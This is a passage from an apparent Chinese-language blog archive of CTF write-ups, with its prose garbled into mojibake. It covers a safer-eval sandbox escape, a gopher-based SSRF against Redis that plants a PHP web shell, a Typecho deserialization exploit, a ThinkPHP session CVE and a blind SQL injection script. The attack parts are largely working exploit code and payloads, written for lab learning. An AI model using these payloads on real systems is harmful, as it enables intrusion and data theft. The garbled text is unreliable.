</tr>
<tr>
<td align="left">radix</td>
<td align="left">å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æã€‚å¦‚æœå®ƒä»¥ â€œ0xâ€ æˆ– â€œ0Xâ€ å¼€å¤´ï¼Œå°†ä»¥ 16 ä¸ºåŸºæ•°ã€‚å¦‚æœè¯¥å‚æ•°å°äº 2 æˆ–è€…å¤§äº 36ï¼Œåˆ™ parseInt() å°†è¿”å› NaNã€‚</td>
</tr>
</tbody></table>
<p>è¿™ä¹Ÿå°±è¯´æ˜ï¼Œå¦‚æœä¼ å…¥delayæ˜¯å¾ˆå¤§å¾ˆå¤§çš„æ•°ï¼Œä¹Ÿå°±ä¸èƒ½è¢«è§£æäº†ï¼Œé‚£æˆ‘ä»¬çš„delayæ­¤æ—¶å˜æˆäº†1ç§’ï¼Œä¹Ÿå°±ç»•è¿‡äº†è¶…æ—¶é™åˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œå’¯ï¼Œå°è¯•ï¼š</p>
<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
<p>å‘ç°æ­¤æ—¶å°±ç»•è¿‡äº†è¶…æ—¶çš„é™åˆ¶äº†ï¼ï¼Œäºæ˜¯å†æ„é€ æ‰§è¡ŒEvalSaferçš„ä»£ç ï¼ŒæŸ¥åˆ°æ˜¯CVE-2019-10769</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ ¸å¿ƒä»£ç å°±æ˜¯theFunctionï¼Œæˆ‘ä»¬ä¼ å…¥è¿›å»æ±¡æŸ“å‚æ•°å³å¯æ‰§è¡Œä»£ç </p>
<p><img src="image-20201028121332238.png" alt="image-20201028121332238"></p>
<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>æ˜¯ä¸€ä¸ªredisçš„é¢˜ç›®..æ²¡æœ‰åšè¿‡è¿™æ ·çš„ï¼Œç¡¬ç€å¤´çš®åšå§ï¼Œè®¿é—®ä¹‹åæ ¹æ®æç¤ºè®¿é—® ?secret</p>
<p><img src="image-20201028124819584.png" alt="image-20201028124819584"></p>
<p>æŸ¥è¯¢äº†ä¸€äº›ï¼Œè¿™æ˜¯å†…ç½‘çš„ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶é¢˜ç›®è¿‡æ»¤äº†127.0.0.1,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶ä»–é¶æœºçš„å†…å®¹</p>
<p><img src="image-20201028125140003.png" alt="image-20201028125140003"></p>
<p>è®¿é—®è¿‡å»ä¹‹åå¥½åƒä¹Ÿä¸æ˜¯å•¥ç©æ„å„¿å•Š,å°è¯•ç”¨fileåè®®çš„æ¼æ´è¯»åˆ°äº†index.phpçš„æºç ï¼š</p>
<p>file:[ç©ºæ ¼]/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;æäº¤</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°è¿‡æ»¤äº†dictåè®®ï¼Œfileåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ï¼Œæˆ‘ä»¬çŒœæƒ³å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œgopheråè®®è¿›è¡Œæ”»å‡»,æœç„¶ï¼Œåœ¨11ç«¯å£ä¸Šæ‰¾åˆ°äº†å˜åŒ–</p>
<p><img src="image-20201028132212757.png" alt="image-20201028132212757"></p>
<p>è®©æˆ‘ä»¬å°è¯•æœåŠ¡ï¼Œå› ä¸ºssrfå¸¸ç”¨çš„å‡ ä¸ªæœåŠ¡å°±æ˜¯mysqlå’Œredisï¼Œäºæ˜¯åˆ†åˆ«è®¿é—®3306ç«¯å£å’Œ6379ç«¯å£</p>
<p>6379ä¸Šå¾—åˆ°ï¼š</p>
<p><img src="image-20201028132532651.png" alt="image-20201028132532651"></p>
<p>å‘ç°æœç„¶æœ‰ERRç«¯å£ï¼Œäºæ˜¯å°è¯•ç”¨gopheråè®®æ‰“ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†ä¸€æ³¢åˆ«äººçš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // è¿è¡Œæœ‰redisçš„ä¸»æœºip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸»æœºIPä¸º:10.160.187.11</p>
<p>å¾—åˆ°payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<h1 id="5-EZä¸‰å‰‘å®¢-EzTypecho"><a href="#5-EZä¸‰å‰‘å®¢-EzTypecho" class="headerlink" title="5.EZä¸‰å‰‘å®¢-EzTypecho"></a>5.EZä¸‰å‰‘å®¢-EzTypecho</h1><p>è¿™é“é¢˜ç›®ï¼Œå‘ƒï¼ŒåŸç†æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥å´å¾ˆç®€å•ï¼Œæ¯”å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>

<p>expå°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ç›´æ¥åœ¨finishæ—¶ä¼šå‘ç°æ— æ³•åˆ©ç”¨çš„æƒ…å†µ</p>
<p><img src="image-20201028171811386.png" alt="image-20201028171811386"></p>
<p>è¿™ä¸ªæ—¶å€™å°±å¿…é¡»çœ‹æºç äº†</p>
<p>æŸ¥æ‰¾sessionï¼Œåœ¨æºç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å»æŸ¥æ‰¾sesionåœ¨å“ªé‡Œèµ‹å€¼ï¼š</p>
<p><img src="image-20201028172113525.png" alt="image-20201028172113525"></p>
<p>ç»“æœå‘ç°ä¸€æ—¦åœ¨è¿™é‡Œå°±è¢«exitåœä¸‹æ¥äº†ï¼Œäºæ˜¯æŸ¥æ‰¾startï¼Œç»“æœå‘ç°æºç å½“ä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>

<p>å‘ç°å®ƒå±…ç„¶æ¥æ”¶ä¸€ä¸ªå‚æ•°â€¦é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç”¨è¿™ä¸ªå»æ‰“å°±è¡Œäº†ï¼Œåˆ©ç”¨è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flagï¼š</p>
<p><img src="image-20201028172325171.png" alt="image-20201028172325171"></p>
<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>â€‹    é¢˜ç›®è™½ç„¶åŸç†éƒ½å¾ˆéš¾ï¼Œä½†æ˜¯åˆ©ç”¨å´å¾ˆç®€å•ï¼Œè‡ªå·±å…ˆæŠŠé¢˜ç›®æˆåŠŸçš„å¤ç°æ¥å‡ºæ¥äº†ï¼Œä»¥åå†é€æ­¥å¤ç°åŸç†æŠŠã€‚</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>php</tag>
        <tag>æ¸—é€</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF_EASYPHP</title>
    <url>/2020/12/11/GYCTF-EASYPHP/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>ååºåˆ—åŒ–é€ƒé€¸</li>
<li>POPé“¾</li>
</ul>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é¢˜ç›®å¯ä»¥dumpä¸‹æ¥wwwä¸‹çš„PHPæ–‡ä»¶ï¼Œåœ¨update.phpä¸‹é¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å³ä½¿ç™»é™†æ²¡æœ‰æˆåŠŸä¹Ÿæ‰§è¡Œäº†update()è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¦è¯´æ¼æ´è‚¯å®šå°±æ˜¯åœ¨è¿™é‡Œäº†ï¼Œé‡ç‚¹åœ¨lib.phpè¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•checkè¿™å„¿ï¼Œå…ˆçœ‹updateå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹è¿™é‡Œååºåˆ—åŒ–äº†getNewInfoå‡½æ•°ï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°è·Ÿè¿›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¹‹åè°ƒç”¨safeå‡½æ•°ï¼Œå¹¶ä¸”åºåˆ—åŒ–äº†å®ƒï¼Œé‚£ä¹ˆå»æ‰¾safeå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°†ä¸æ»¡6çš„ä¸œè¥¿å˜æˆäº†hackï¼Œæœ‰é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥é€ æˆååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ›´æ–°æµç¨‹ï¼Œä½†å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸åº”è¯¥è·Ÿç€ä»–çš„æ€è·¯å»èµ°ï¼Œå› ä¸ºæœ‰äº†ååºåˆ—åŒ–é€ƒé€¸ï¼Œ<strong>æ‰€ä»¥nicknameæˆ‘ä»¬å¯ä»¥ä»»æ„æ§åˆ¶</strong>ï¼Œ</p>
<p>æˆ‘ä»¬åœ¨getNewInfoè¿™é‡Œå¯ä»¥çœ‹è§newäº†ä¸€ä¸ªinfoç±»ï¼ŒinFoç±»è¿™é‡Œå¾ˆæ˜æ˜¾é™¤äº†__constructä¹‹å¤–è¿˜æœ‰æœ‰ä¸ªcallã€‚é‚£ä¹ˆé¢˜ç›®åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬æ§åˆ¶ä»»æ„çš„sqlè¯­å¥æŸ¥è¯¢-&gt;å¾—åˆ°ä¸€ä¸ªæ’ä¸ºçœŸçš„ç»“æœ-&gt;ç™»é™†æˆåŠŸã€‚</p>
<p>å›åˆ°é¢˜ç›®è¿™é‡Œçš„æƒ…å†µè®¾æƒ³ä¸‹ï¼Œæ— è®ºç™»é™†æˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•æ‰§è¡Œupdateå‡½æ•°ï¼Œupdateå‡½æ•°è¿™é‡Œnewäº†UpdateHelperç±»ï¼Œåœ¨ç±»è¢«é”€æ¯çš„æ—¶å€™è¾“å‡ºäº†$this-&gt;sql</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020_EasyThinking</title>
    <url>/2021/03/25/GYCTF2020-EasyThinking/</url>
    <content><![CDATA[<p><a href="http://www.zip/">www.zip</a> å¯ä»¥ä¸‹è½½æºç </p>
<p>è¿›å»å…ˆçœ‹ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯thinkphp6.0ï¼Œæœä¸€ä¸‹CVEï¼Œå‘ç°æœ‰è¿™ä¹ˆä¸€ä¸ªæ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;god_zzZ&#x2F;article&#x2F;details&#x2F;104275241?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm&#x3D;1001.2101.3001.4242</span><br></pre></td></tr></table></figure>

<p>çœ‹äº†çœ‹session.phpçš„ï¼Œå—¯ï¼Œæœç„¶æ»¿è¶³åˆ©ç”¨æ¡ä»¶çš„ç¯å¢ƒ</p>
<p><img src="image-20210325171916063.png" alt="image-20210325171916063"></p>
<p>é‚£ä¹ˆæ ¹æ®ä½œè€…ç»™å‡ºçš„æ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾ä¸€ä¸ªåœ°æ–¹ï¼Œåˆ©ç”¨åˆ°äº†sessionå‡½æ•°ä¸”å€¼å¯æ§ï¼Œå¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°å†è¿™é‡Œï¼š</p>
<p><img src="image-20210325172126374.png" alt="image-20210325172126374"></p>
<p>é‚£ä¹ˆåˆ©ç”¨ä¹Ÿå¾ˆç®€å•äº†ï¼Œæ ¹æ®ç»™å‡ºçš„åˆ©ç”¨æ–¹å¼æ„é€ å³å¯ï¼š</p>
<p><img src="image-20210325172156904.png" alt="image-20210325172156904"></p>
<p>ä¹‹åçš„ç»•è¿‡é™åˆ¶å¯ä»¥ç”¨èšå‰‘ä¸€é”®è·‘å°±è¡Œã€‚</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>CVE</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020Ezsqli</title>
    <url>/2020/11/19/GYCTF2020Ezsqli/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h1><p>ç›²æ³¨ï¼Œæ— åˆ—åæ³¨å…¥ã€‚ä¸€æ ·çš„å°è¯•æ„é€ æ³¨å…¥è¯­å¥ä¹‹åï¼š</p>
<p>è¿™é‡Œåˆ©ç”¨äº†ç½‘ç«™çš„ç‰¹æ€§ï¼Œå½“æ¡ä»¶æˆç«‹çš„æ—¶å€™è¿”å›NU1l,å¤±è´¥çš„æ—¶å€™ï¼Œå°±æ˜¯V&amp;N</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        sql = <span class="string">&quot;if(ascii(  substr( database() ,&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;V&amp;N&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥å¾—åˆ°è¡¨åï¼š</p>
